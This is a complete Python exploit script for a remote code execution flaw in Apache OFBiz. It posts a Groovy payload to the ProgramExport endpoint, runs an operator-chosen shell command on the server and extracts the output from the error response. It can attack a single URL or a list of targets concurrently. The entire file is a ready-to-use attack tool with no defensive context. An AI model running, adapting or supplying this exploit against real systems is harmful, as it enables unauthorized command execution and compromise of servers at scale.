import aiohttp
import asyncio
import argparse
import sys

def print_info(message):
    print(f"\033[94m[!]\033[0m {message}")

def print_exploit(message):
    print(f"\033[92m[*]\033[0m {message}")

def print_error(message):
    print(f"\033[91m[!]\033[0m {message}")

async def exploit_apache_ofbiz(session, url, command, verbose=False):
    payload = {
        'groovyProgram': f"throw new Exception('{command}'.execute().text);"
    }

    headers = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    exploit_path = "/webtools/control/main/ProgramExport"
    target_url = f"{url}{exploit_path}"

    try:
        async with session.post(target_url, data=payload, headers=headers, timeout=5) as response:
            text = await response.text()
            if response.status == 200:
                if 'java.lang.Exception' in text:
                    start = text.find('java.lang.Exception: ') + len('java.lang.Exception: ')
                    end = text.find('</p>', start)
                    output = text[start:end].strip()
                    print_exploit(f"Exploit successful on {url}, output:")
                    print(output)
                else:
                    print_info(f"Exploit executed but did not return expected output on {url}.")
            else:
                print_error(f"Failed to connect to {url}, HTTP status code: {response.status}")
    except asyncio.TimeoutError:
        if verbose:
            print_error(f"Timeout connecting to {url}")
    except aiohttp.ClientError as e:
        if verbose:
            print_error(f"Error connecting to {url}: {e}")

async def main(command, targets, verbose):
    async with aiohttp.ClientSession() as session:
        tasks = [exploit_apache_ofbiz(session, target, command, verbose) for target in targets]
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Apache OFBiz RCE Exploit')
    parser.add_argument('command', help='Command to execute on the target(s)')
    parser.add_argument('-t', '--target', help='Target URL (e.g., http://example.com)')
    parser.add_argument('-f', '--file', help='File containing list of target URLs')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose mode')
    args = parser.parse_args()

    if not args.target and not args.file:
        print_error("You must specify a target URL with -t or a file with targets using -f.")
        sys.exit(1)

    target_list = []

    if args.target:
        print_info(f"Testing single target: {args.target}")
        target_list.append(args.target)

    if args.file:
        try:
            with open(args.file, 'r') as f:
                targets = [line.strip() for line in f.readlines()]
                print_info(f"Testing multiple targets from file: {args.file}")
                target_list.extend(targets)
        except FileNotFoundError:
            print_error(f"File not found: {args.file}")
            sys.exit(1)

    asyncio.run(main(args.command, target_list, args.verbose))
